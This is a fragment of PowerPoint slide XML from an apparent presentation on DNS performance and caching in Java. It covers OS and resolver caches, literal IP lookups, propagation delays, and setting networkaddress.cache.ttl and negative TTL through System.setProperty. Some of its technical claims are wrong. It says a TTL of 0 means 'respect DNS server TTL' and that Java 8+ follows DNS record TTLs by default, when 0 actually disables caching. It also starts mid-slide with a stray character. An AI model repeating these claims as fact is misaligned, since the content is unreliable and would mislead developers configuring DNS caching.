              <a:t>秒</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>System-Level Caching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Java relies on but doesn't control:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Operating system DNS cache (varies by OS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Recursive DNS server caches (TTL determined by domain owner)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>These external caches may persist results for hours</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="238125"/>
            <a:ext cx="9829800" cy="762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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Performance and Caching in Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C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537446" y="1447800"/>
            <a:ext cx="10951634" cy="4216539"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>IP Address Handling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="0066FF"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>("192.0.2.1") with literal IP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Bypasses DNS resolution entirely</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Immediately creates the address object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>No caching involved for pure IP inputs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Propagation Considerations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="0066FF"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>DNS changes may take hours to globally propagate due to:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>TTL settings in DNS records</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" lvl="2" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="CC3300"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Layered caching throughout DNS hierarchy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="0066FF"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="080808"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Java's cache is just one layer in this system</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="238125"/>
            <a:ext cx="9829800" cy="7620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342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" kern="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Performance and Caching in Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C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76200" y="1143000"/>
            <a:ext cx="11887200" cy="3886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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="152400"/>
            <a:ext cx="11353800" cy="6195060"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DNS Cache Configuration in Java</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>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400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:tabLst>
                <a:tab pos="4572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Negative Cache TTL           </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>// Set negative DNS cache duration (failed lookups)</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0" marR="0" indent="457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>System.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>", "10");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:tabLst>
                <a:tab pos="9144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Controls how long failed DNS lookups are cached , Default: 10 seconds (Java 8+)</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:tabLst>
                <a:tab pos="9144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Value interpretation:</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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0 = disable negative caching</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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&gt;0 = cache duration in seconds</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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-1 = cache indefinitely (not recommended)</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1371600" marR="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </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R="0" lvl="0">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:tabLst>
                <a:tab pos="4572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2. Positive Cache TTL     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>// Set successful DNS cache duration</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0" marR="0" indent="457200">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>System.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>", "30");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:tabLst>
                <a:tab pos="9144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Controls caching of successful DNS resolutions</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:tabLst>
                <a:tab pos="9144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Default behavior:</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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Java 7 and earlier: Cache forever (-1)</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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Java 8+: Respect DNS TTL by default (0)</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742950" marR="0" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:tabLst>
                <a:tab pos="9144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Special values:</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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-1 = cache permanently (security risk)</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ts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="13716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0 = respect DNS server TTL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1143000" marR="0" lvl="2" indent="-228600">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
